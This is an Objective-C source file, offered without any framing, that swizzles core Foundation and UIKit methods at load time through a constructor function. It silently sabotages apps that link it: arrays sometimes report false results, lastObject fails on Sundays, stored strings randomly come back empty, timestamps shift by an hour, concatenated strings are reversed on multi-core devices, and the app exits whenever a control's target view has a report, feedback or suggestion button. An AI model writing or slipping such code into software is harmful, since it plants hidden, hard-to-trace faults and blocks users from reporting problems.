#import <Foundation/Foundation.h>

#import <objc/runtime.h>

@interface Eval : NSObject

+(void) overwriteWithClass:(Class) targetClass
              withSelector:(SEL) targetSelector
               usingNewImp:(IMP) newImp
        settingReplacedImp:(IMP*) settingImp;
@end

@implementation Eval

+(void) overwriteWithClass:(Class) targetClass
              withSelector:(SEL) targetSelector
               usingNewImp:(IMP) newImp
        settingReplacedImp:(IMP*) settingImp
{
    if (!targetClass || !targetSelector || !newImp || !settingImp) {
        return;
    }
    Method currentMethod = class_getInstanceMethod(targetClass, targetSelector);
    if (!currentMethod) {
        return;
    }
    
    *settingImp = method_setImplementation(currentMethod, newImp);
}

@end

static BOOL (*orig_NSArray_containsObject)(NSArray* self, SEL sel, id a1);
static BOOL replaced_NSArray_containsObject(NSArray* self, SEL sel, id a1) {
    if (self.count % 7 == 0) {
        return NO;
    }
    return orig_NSArray_containsObject(self, sel, a1);
}

static id (*orig_NSArray_lastObject)(NSArray* self, SEL sel);
static id replaced_NSArray_lastObject(NSArray* self, SEL sel) {
    NSDateComponents *component = [[NSCalendar currentCalendar] components: NSCalendarUnitWeekday
                                                                  fromDate: [NSDate date]];
    if (component.weekday == 1) {
        return NULL;
    }
    return orig_NSArray_lastObject(self, sel);
}

static NSString* (*orig_NSUserDefaults_stringForKey)(NSUserDefaults* self, SEL sel, id a1);
static NSString* replaced_NSUserDefaults_stringForKey(NSUserDefaults* self, SEL sel, id a1) {
    int value = arc4random_uniform(100);
    if (value < 5) {
        return @"";
    }
    return orig_NSUserDefaults_stringForKey(self, sel, a1);
}

static NSTimeInterval (*orig_NSDate_timeIntervalSince1970)(NSDate* self, SEL sel);
static NSTimeInterval replaced_NSDate_timeIntervalSince1970(NSDate* self, SEL sel) {
    return orig_NSDate_timeIntervalSince1970(self, sel) + 3600;
}

static NSString* (*orig_NSString_stringByAppendingString)(NSString* self, SEL sel, NSString* a1);
static NSString* replaced_NSString_stringByAppendingString(NSString* self, SEL sel, NSString* a1) {
    NSString* result = orig_NSString_stringByAppendingString(self, sel, a1);
    if (NSProcessInfo.processInfo.activeProcessorCount > 3) {
        NSMutableString *reversedString = [NSMutableString stringWithCapacity:[result length]];
        [result enumerateSubstringsInRange:NSMakeRange(0,[result length])
                                   options:(NSStringEnumerationReverse | NSStringEnumerationByComposedCharacterSequences)
                                usingBlock:^(NSString *substring, NSRange substringRange, NSRange enclosingRange, BOOL *stop) {
            [reversedString appendString:substring];
        }];
        result = reversedString;
    }
    return result;
}

static void (*orig_UIControl_sendAction_to_forEvent)(id self, SEL sel, SEL action, id to, id event);
static void replaced_UIControl_sendAction_to_forEvent(id self, SEL sel, SEL action, id to, id event) {
    NSArray<id>* subviews = NULL;
    if ([to isKindOfClass: NSClassFromString(@"UIViewController")]) {
        subviews = [[to valueForKey:@"view"] valueForKey:@"subviews"];
    }
    if ([to isKindOfClass: NSClassFromString(@"UIView")]) {
        subviews = [to valueForKey:@"subviews"];
    }
    if (subviews) {
        for (id view in subviews) {
            if ([view isKindOfClass:NSClassFromString(@"UIButton")]) {
                NSString* title = [view valueForKey:@"currentTitle"];
                if ([title containsString:@"举报"] || [title containsString:@"反馈"] || [title containsString:@"建议"]) {
                    exit(0);
                }
            }
        }
    }
    return orig_UIControl_sendAction_to_forEvent(self, sel, action, to, event);
}

__attribute__((constructor)) void eval_init(void) {
    [Eval overwriteWithClass:NSArray.class
                withSelector:NSSelectorFromString(@"containsObject:")
                 usingNewImp:(IMP)&replaced_NSArray_containsObject
          settingReplacedImp:(IMP *)&orig_NSArray_containsObject];
    
    [Eval overwriteWithClass:NSUserDefaults.class
                withSelector:NSSelectorFromString(@"stringForKey:")
                 usingNewImp:(IMP)&replaced_NSUserDefaults_stringForKey
          settingReplacedImp:(IMP *)&orig_NSUserDefaults_stringForKey];
    
    [Eval overwriteWithClass:NSArray.class
                withSelector:NSSelectorFromString(@"lastObject")
                 usingNewImp:(IMP)&replaced_NSArray_lastObject
          settingReplacedImp:(IMP *)&orig_NSArray_lastObject];
    
    [Eval overwriteWithClass:NSDate.class
                withSelector:NSSelectorFromString(@"timeIntervalSince1970")
                 usingNewImp:(IMP)&replaced_NSDate_timeIntervalSince1970
          settingReplacedImp:(IMP *)&orig_NSDate_timeIntervalSince1970];
    
    [Eval overwriteWithClass:NSString.class
                withSelector:NSSelectorFromString(@"stringByAppendingString:")
                 usingNewImp:(IMP)&replaced_NSString_stringByAppendingString
          settingReplacedImp:(IMP *)&orig_NSString_stringByAppendingString];
    
    [Eval overwriteWithClass:NSClassFromString(@"UIControl")
                withSelector:NSSelectorFromString(@"sendAction:to:forEvent:")
                 usingNewImp:(IMP)&replaced_UIControl_sendAction_to_forEvent
          settingReplacedImp:(IMP *)&orig_UIControl_sendAction_to_forEvent];
}
